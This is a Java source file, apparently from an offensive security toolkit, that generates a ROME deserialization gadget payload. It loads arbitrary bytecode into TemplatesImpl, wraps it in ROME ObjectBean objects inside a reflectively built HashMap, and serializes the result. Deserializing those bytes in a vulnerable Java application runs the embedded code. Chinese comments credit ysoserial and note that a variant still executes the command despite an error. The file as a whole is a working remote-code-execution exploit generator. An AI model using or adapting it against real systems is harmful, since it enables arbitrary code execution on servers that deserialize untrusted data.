package org.sec.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.PriorityQueue;

public class ROME extends Payload {
    @SuppressWarnings("all")
    public static byte[] getPayloadUseByteCodes(byte[] byteCodes) {
        try {
            TemplatesImpl templatesimpl = new TemplatesImpl();
            Field fieldByteCodes = templatesimpl.getClass().getDeclaredField("_bytecodes");
            fieldByteCodes.setAccessible(true);
            fieldByteCodes.set(templatesimpl, new byte[][]{byteCodes});

            Field fieldName = templatesimpl.getClass().getDeclaredField("_name");
            fieldName.setAccessible(true);
            fieldName.set(templatesimpl, "1");
            // 要通过2个objectbean才能达成触发条件
            ObjectBean objectBean1 = new ObjectBean(Templates.class, templatesimpl);
            ObjectBean objectBean2 = new ObjectBean(ObjectBean.class, objectBean1);
            // 设置hashmap，参考ysoserial
            HashMap hashmap = new HashMap();
            Field fieldsize = hashmap.getClass().getDeclaredField("size");
            fieldsize.setAccessible(true);
            fieldsize.set(hashmap,2);
            Class nodeC = Class.forName("java.util.HashMap$Node");
            Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);
//        Object tbl = Array.newInstance(nodeC, 2); 也可以只写入objectBean2, 就是会报错(但还是执行了命令)
            Object tbl = Array.newInstance(nodeC, 1);
//        Array.set(tbl, 0, nodeCons.newInstance(0, objectBean1, objectBean1, null));
            Array.set(tbl, 0, nodeCons.newInstance(0, objectBean2, objectBean2, null));
            Field fieldtable = hashmap.getClass().getDeclaredField("table");
            fieldtable.setAccessible(true);
            fieldtable.set(hashmap,tbl);
            return serialize(hashmap);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
